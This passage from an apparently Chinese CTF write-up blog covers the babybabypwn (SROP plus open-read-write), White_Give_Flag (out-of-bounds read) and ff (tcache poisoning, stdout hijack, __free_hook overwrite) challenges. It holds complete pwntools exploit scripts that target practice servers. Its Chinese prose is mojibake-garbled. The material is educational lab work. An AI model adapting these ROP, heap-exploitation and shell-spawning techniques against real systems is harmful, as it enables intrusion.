libc.search(asm(<span class="string">&#x27;pop rdi\nret&#x27;</span>)).__next__()</span><br><span class="line">pop_rsi_ret = libc_base + libc.search(asm(<span class="string">&#x27;pop rsi\nret&#x27;</span>)).__next__()</span><br><span class="line">pop_rdx_ret = libc_base + libc.search(asm(<span class="string">&#x27;pop rdx\nret&#x27;</span>)).__next__()</span><br><span class="line">flag_addr = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = p64(pop_rdi_ret) + p64(<span class="number">0</span>) + p64(pop_rsi_ret) + p64(flag_addr) + p64(pop_rdx_ret) + p64(<span class="number">10</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]) <span class="comment"># read str &#x27;flag&#x27; from input</span></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(flag_addr) + p64(pop_rsi_ret) + p64(<span class="number">4</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;open&#x27;</span>])<span class="comment"># open file &#x27;flag&#x27;</span></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">3</span>) + p64(pop_rsi_ret) + p64(flag_addr) + p64(pop_rdx_ret) + p64(<span class="number">0x30</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>])<span class="comment"># read flag from file ptr 3(opened by open())</span></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(flag_addr) + p64(libc_base + libc.sym[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span> * offset  + p64(<span class="number">0xdeadbeef</span>) + p64(ret)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.send(<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯è·å¾—flag</p>
<p><img src="https://i.loli.net/2021/02/01/gvyxEP6DSI3zwFr.png"></p>
<h2 id="V-amp-N2020-å…¬å¼€èµ›-babybabypwn-SROP-orw"><a href="#V-amp-N2020-å…¬å¼€èµ›-babybabypwn-SROP-orw" class="headerlink" title="[V&amp;N2020 å…¬å¼€èµ›]babybabypwn - SROP + orw"></a>[V&amp;N2020 å…¬å¼€èµ›]babybabypwn - SROP + orw</h2><p>æƒ¯ä¾‹çš„ <code>checksec</code> ï¼Œä¿æŠ¤å…¨å¼€</p>
<p><img src="https://i.loli.net/2021/03/28/8cBI91MdZ6Fkh4P.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p>è®¾ç½®äº† <code>seccomp</code> æ²¡æ³•æ‹¿shellï¼Œè€ƒè™‘èµ° orw æ‹¿flag</p>
<p><img src="https://i.loli.net/2021/03/28/KGHNtIBhfWqkVLl.png" alt="image.png"></p>
<p>ç»™å‡ºäº† libc åŸºå€ï¼Œç™½ç»™ä¸€ä¸ª <code>rt_sigreturn</code>çš„ç³»ç»Ÿè°ƒç”¨ï¼Œç›´æ¥ æ ˆè¿ç§» + orw ä¸€å¥—å¸¦èµ°</p>
<p><img src="https://i.loli.net/2021/03/28/KzhsFjwtaA4fiQn.png" alt="image.png"></p>
<p>æ„é€  exp å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">29143</span>)<span class="comment">#process(&#x27;./vn_pwn_babybabypwn_1&#x27;)#</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)<span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)#</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Here is my gift: &#x27;</span>)</span><br><span class="line">puts_addr = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop = <span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;libc base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = libc_base + libc.search(asm(<span class="string">&#x27;pop rdi ; ret&#x27;</span>)).__next__()</span><br><span class="line">pop_rsi_ret = libc_base + libc.search(asm(<span class="string">&#x27;pop rsi ; ret&#x27;</span>)).__next__()</span><br><span class="line">pop_rdx_pop_rbx_ret = libc_base + libc.search(asm(<span class="string">&#x27;pop rdx ; pop rbx ; ret&#x27;</span>)).__next__()</span><br><span class="line">flag_addr = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rdi = <span class="number">0</span></span><br><span class="line">frame.rsi = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">frame.rdx = <span class="number">0x100</span></span><br><span class="line">frame.rip = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">frame.rsp = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>] + <span class="number">8</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;./flag\x00\x00&#x27;</span></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(flag_addr) + p64(pop_rsi_ret) + p64(<span class="number">4</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;open&#x27;</span>])</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">3</span>) + p64(pop_rsi_ret) + p64(flag_addr) + p64(pop_rdx_pop_rbx_ret) + p64(<span class="number">0x100</span>) + p64(<span class="number">0</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">1</span>) + p64(pop_rsi_ret) + p64(flag_addr) + p64(pop_rdx_pop_rbx_ret) + p64(<span class="number">0x100</span>) + p64(<span class="number">0</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(<span class="built_in">bytes</span>(frame)[<span class="number">8</span>:])</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯è·å¾—flag</p>
<p><img src="https://i.loli.net/2021/03/28/bamD1vJYnFMWskN.png" alt="image.png"></p>
<h1 id="VNCTF2021-Pwn"><a href="#VNCTF2021-Pwn" class="headerlink" title="VNCTF2021 - Pwn"></a>VNCTF2021 - Pwn</h1><p>å¤ªæ£’äº†ï¼Œæˆ‘é€æ¸ç†è§£ä¸€åˆ‡.jpg</p>
<h2 id="VNCTF-2021-White-Give-Flag-read-out-of-bounds"><a href="#VNCTF-2021-White-Give-Flag-read-out-of-bounds" class="headerlink" title="[VNCTF 2021]White_Give_Flag - read out of bounds"></a>[VNCTF 2021]White_Give_Flag - read out of bounds</h2><p>æƒ¯ä¾‹çš„ <code>checksec</code> ï¼Œä¿æŠ¤å…¨å¼€</p>
<p><img src="https://i.loli.net/2021/04/01/nwjrFpHgQ1zJcEa.png" alt="image.png"></p>
<p>åˆ†æä¸»å‡½æ•°é€»è¾‘å¯ä»¥å‘ç°ä»…æä¾›äº†åˆ†é…ã€é‡Šæ”¾ã€ç¼–è¾‘å †å—çš„åŠŸèƒ½ï¼Œä»¥åŠä¸€ä¸ªæ— ç”¨çš„æ‰“å°éšæœºæ•°çš„åŠŸèƒ½ï¼Œå¹¶ä¸å­˜åœ¨æ˜æ˜¾æ¼æ´</p>
<p><img src="https://i.loli.net/2021/04/02/arpekP6iS8wHIC4.png" alt="image.png"></p>
<p>åœ¨å¼€å¤´çš„åˆå§‹åŒ–è¿‡ç¨‹ä¸­ä¼šéšæœºmallocæ•°æ¬¡å¹¶è¯»å…¥flagå†…å®¹ï¼Œå…¶ä¸­æœ€åä¸€æ¬¡å¹¶æ²¡æœ‰æ¸…ç©ºå †å—ï¼Œflagå†…å®¹å­˜åœ¨äº <code>[0x300, 0x500]</code> å¤§å°çš„æŸä¸ªå †å—ä¸­</p>
<p><img src="https://i.loli.net/2021/04/01/1jfGBdwcme4Jzh3.png" alt="image.png"></p>
<p>åœ¨ä¸»å‡½æ•°ä¸­è¯»å…¥é€‰é¡¹æ—¶æœ‰ä¸ª bug ï¼šè¿”å›å€¼å¹¶éè¯»å…¥çš„æ•°æ®é€šè¿‡atoiè½¬æˆçš„æ•°å€¼ï¼Œè€Œæ˜¯read() çš„è¿”å›å€¼ï¼Œå³è¯»å…¥çš„é•¿åº¦</p>
<p><img src="https://i.loli.net/2021/04/01/ArZkfW4yzwxiDaH.png" alt="image.png"></p>
<p>è€Œè¯»å…¥é€‰é¡¹åä¼šæ‰“å° <code>qword_202120</code>æ•°ç»„ä¸­çš„å­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯ï¼šè‹¥æ˜¯æˆ‘ä»¬ç›´æ¥å‘é€ <code>EOF</code> ï¼Œåˆ™ read() ä¼šè¿”å› <code>0</code>ï¼Œæˆ‘ä»¬å³å¯å‘å‰è¶Šç•Œè¯»ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨ pwntools åº“ä¸­çš„ <code>shutdown_raw()</code> å‡½æ•°å®Œæˆ</p>
<p><img src="https://i.loli.net/2021/04/01/vXoUfw2rhDKl75k.png" alt="image.png"></p>
<p>å‰é¢åˆšå¥½æ˜¯å‚¨å­˜å †å—çš„æ•°ç»„ï¼Œåˆšå¥½å¯ä»¥è¯»åˆ°ç¬¬å››ä¸ªå †å—</p>
<p><img src="https://i.loli.net/2021/04/01/rRU4MJPxQe9nW5p.png" alt="image.png"></p>
<p>é‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦ä¸æ–­å°è¯•åˆ†é…åˆ°ä¸€ä¸ªå­˜åœ¨ flag çš„å †å—åæ‰“å°å³å¯</p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">global</span> p</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;choice:&quot;</span>)</span><br><span class="line">    p.sendline(command * <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">0</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;size:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;index:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;index:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Content:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>(<span class="params">hit</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        new(<span class="number">0x10</span>)</span><br><span class="line">    new(<span class="number">0x300</span> + hit * <span class="number">0x10</span>)</span><br><span class="line">    edit(<span class="number">3</span>, <span class="string">&#x27;arttnba3arttnba4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;choice:&#x27;</span>)</span><br><span class="line">    p.shutdown_raw(<span class="string">&#x27;send&#x27;</span>)</span><br><span class="line">    s = p.recv()</span><br><span class="line">    log.info(s)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;&#123;&#x27;</span> <span class="keyword">in</span> s <span class="keyword">or</span> <span class="string">b&#x27;&#125;&#x27;</span> <span class="keyword">in</span> s:</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;try time: &#x27;</span> + <span class="built_in">str</span>(count))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;try: &#x27;</span> + <span class="built_in">str</span>(i) + <span class="string">&#x27; now&#x27;</span>)</span><br><span class="line">            p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">39123</span>)<span class="comment">#process(&#x27;./whitegive&#x27;)</span></span><br><span class="line">            exp(i)</span><br><span class="line">            p.close()</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            i %= <span class="number">0x20</span></span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            log.failure(<span class="string">&#x27;exception!&#x27;</span>)</span><br><span class="line">            p.close()</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            i %= <span class="number">0x20</span></span><br><span class="line">            count += <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯è·å¾—flag</p>
<p>ï¼ˆéƒ½è¦ç»™éé…‹çˆ†å‚»äº†ï¼‰</p>
<p><img src="https://i.loli.net/2021/04/02/LiKChB2Vgmo5wvt.png" alt="image.png"></p>
<h2 id="VNCTF-2021-ff-tcache-poisoning-IO-FILE-hijack"><a href="#VNCTF-2021-ff-tcache-poisoning-IO-FILE-hijack" class="headerlink" title="[VNCTF 2021]ff - tcache poisoning + IO_FILE hijack"></a>[VNCTF 2021]ff - tcache poisoning + IO_FILE hijack</h2><p>æƒ¯ä¾‹çš„ <code>checksec</code> ï¼Œä¿æŠ¤å…¨å¼€</p>
<p><img src="https://i.loli.net/2021/03/28/GnvgcRy2Sdz8MY4.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p>å¤§è‡´æ˜¯æœ‰ç€åˆ†é…ã€é‡Šæ”¾ã€æ‰“å°ã€ç¼–è¾‘å †å—åŠŸèƒ½çš„ç¨‹åºï¼Œä½†æ˜¯é™åˆ¶äº†åªèƒ½ç¼–è¾‘ä¸¤æ¬¡ã€æ‰“å°ä¸€æ¬¡ï¼ŒåŒæ—¶<strong>ä¸€æ¬¡åªèƒ½æ“ä½œä¸€ä¸ªå †å—</strong></p>
<p><img src="https://i.loli.net/2021/03/28/vz5wyYXgJxA6pIu.png" alt="image.png"></p>
<p>é‡Šæ”¾åŠŸèƒ½ä¸­æ²¡æœ‰æ¸…ç©ºï¼Œå­˜åœ¨ UAF</p>
<p><img src="https://i.loli.net/2021/03/28/JXQhGvoTieV14xa.png" alt="image.png"></p>
<p>ä½†æ˜¯libc çš„ç‰ˆæœ¬ä¸º <code>2.32</code> ï¼Œé‚£ä¹ˆæˆ‘ä»¬éœ€è¦ç”¨æ‰å”¯ä¸€çš„ä¸€æ¬¡æ‰“å°çš„æœºä¼šæ³„éœ²å †åŸºå€æ‰èƒ½é€šè¿‡ double free è¿›è¡Œä»»æ„åœ°å€å†™</p>
<p>è€Œæˆ‘ä»¬è¿˜éœ€è¦æƒ³åŠæ³•æ³„éœ² libc åŸºå€ï¼Œä½†æ˜¯æˆ‘ä»¬åªèƒ½åˆ†é… <code>0x80</code> çš„å †å—ï¼Œå³ä½¿åŠ«æŒäº† tcache struct åæ‰€é‡Šæ”¾çš„å †å—ä¹Ÿåªèƒ½å¤Ÿè¿›å…¥fastbinä¸­ï¼ˆè€Œä¸”æˆ‘ä»¬ä¸€æ¬¡åªèƒ½æ“ä½œä¸€ä¸ªå †å—</p>
<p><img src="https://i.loli.net/2021/03/28/qKEHz4FSWkXJ8lM.png" alt="image.png"></p>
<p>è€ƒè™‘åˆ° tcache struct æœ¬èº«ä¾¿æ˜¯ä¸€ä¸ª <code>0x291</code>çš„å †å—ï¼Œæˆ‘ä»¬å¯ä»¥åŠ«æŒä¹‹åæ”¹å¯¹åº”è®¡æ•°ä¸º7åfreeæ‰ï¼Œé€å…¥ unsorted bin ä¸­ï¼Œä¹‹ååˆ‡å‰²è¿™ä¸ªå¤§chunkï¼Œåˆ©ç”¨æ®‹ç•™æŒ‡é’ˆ å¤§æ¦‚1&#x2F;16 çš„å‡ ç‡å¯ä»¥çˆ†ç ´åˆ° stdout é™„è¿‘ï¼ŒåŠ«æŒ stdout ä»¥æ³„éœ² libc åŸºå€ï¼Œæœ€åæ”¹ <code>__free_hook</code> ä¸º system å‡½æ•°åé‡Šæ”¾ä¸€ä¸ªå†…å®¹ä¸º <code>/bin/sh </code>çš„ chunk å³å¯ get shell</p>
<blockquote>
<p>éé…‹çš„è¯å¯èƒ½è¦çˆ†ç ´å¾ˆä¹…â€¦</p>
</blockquote>
<p>æ•…æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">global</span> p</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)<span class="comment">#ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(command).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Size:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Content:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>():</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">content</span>):</span><br><span class="line">    cmd(<span class="number">5</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Content:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>(<span class="params">hit_byte</span>):</span><br><span class="line">    new(<span class="number">0x80</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    free()</span><br><span class="line">    show()</span><br><span class="line"></span><br><span class="line">    heap_leak = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    heap_base = heap_leak * <span class="number">0x1000</span></span><br><span class="line">    log.success(<span class="string">&#x27;heap base: &#x27;</span> + <span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">    edit(<span class="string">b&#x27;arttnba3arttnba4&#x27;</span>)</span><br><span class="line">    free()</span><br><span class="line">    edit(p64(heap_leak ^ (heap_base + <span class="number">0x10</span>)))</span><br><span class="line">    new(<span class="number">0x80</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    new(<span class="number">0x80</span>, <span class="string">b&#x27;\x00\x00&#x27;</span> * (<span class="number">0xe</span> + <span class="number">0x10</span> + <span class="number">9</span>) + <span class="string">b&#x27;\x07\x00&#x27;</span>)</span><br><span class="line">    free()</span><br><span class="line"></span><br><span class="line">    new(<span class="number">0x40</span>, (<span class="string">b&#x27;\x00\x00&#x27;</span> * <span class="number">3</span> + <span class="string">b&#x27;\x01\x00&#x27;</span> + <span class="string">b&#x27;\x00\x00&#x27;</span> * <span class="number">2</span> + <span class="string">b&#x27;\x01\x00&#x27;</span>).ljust(<span class="number">0x70</span>, <span class="string">b&#x27;\x00&#x27;</span>)) <span class="comment"># unknown reason, bigger than 0x48 will failed.</span></span><br><span class="line">    new(<span class="number">0x30</span>, <span class="string">b&#x27;\x00&#x27;</span>.ljust(<span class="number">0x30</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    new(<span class="number">0x10</span>, p64(<span class="number">0</span>) + <span class="string">b&#x27;\xc0&#x27;</span> + p8(hit_byte * <span class="number">0x10</span> + <span class="number">6</span>)) <span class="comment"># 1/16 to hit stdout</span></span><br><span class="line">    new(<span class="number">0x40</span>, p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    libc_base = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x1e4744</span></span><br><span class="line">    new(<span class="number">0x10</span>, p64(libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">    new(<span class="number">0x70</span>, p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    free()</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    count = <span class="number">1</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;the no.&#x27;</span> + <span class="built_in">str</span>(count) + <span class="string">&#x27; try&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">b&#x27;try: &#x27;</span> + <span class="string">b&#x27;\xc0&#x27;</span> + p8(i * <span class="number">0x10</span> + <span class="number">6</span>))</span><br><span class="line">            p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">26018</span>)<span class="comment">#process(&#x27;./ff&#x27;) #</span></span><br><span class="line">            exp(i)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line">            p.close()</span><br><span class="line">            i = i + <span class="number">1</span></span><br><span class="line">            count = count + <span class="number">1</span></span><br><span class="line">            i = i % <span class="number">16</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯get shell</p>
<p><img src="https://i.loli.net/2021/03/28/jiQUwRnTrZfuEty.png" alt="image.png"></p>
<blockquote>
<h3 id="glibc2-32ä¸‹tcacheæ–°å¢çš„ä¿æŠ¤"><a href="#glibc2-32ä¸‹tcacheæ–°å¢çš„ä¿æŠ¤" class="headerlink" title="glibc2.32ä¸‹tcacheæ–°å¢çš„ä¿æŠ¤"></a>glibc2.32ä¸‹tcacheæ–°å¢çš„ä¿æŠ¤</h3><p>ä¸€å¼€å§‹é¢˜ç›®ç»™å‡ºçš„libcç‰ˆæœ¬ä¸º2.32ï¼Œç¬”è€…åŸä»¥ä¸ºå’Œlibc2.31åº”å½“æ²¡æœ‰å¤ªå¤§åŒºåˆ«ï¼Œæ•…æœ€åˆæƒ³çš„è§£æ³•ä¾¿æ˜¯ 1&#x2F;16 çš„å‡ ç‡çˆ†ç ´åˆ°tcache structï¼Œexpå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span 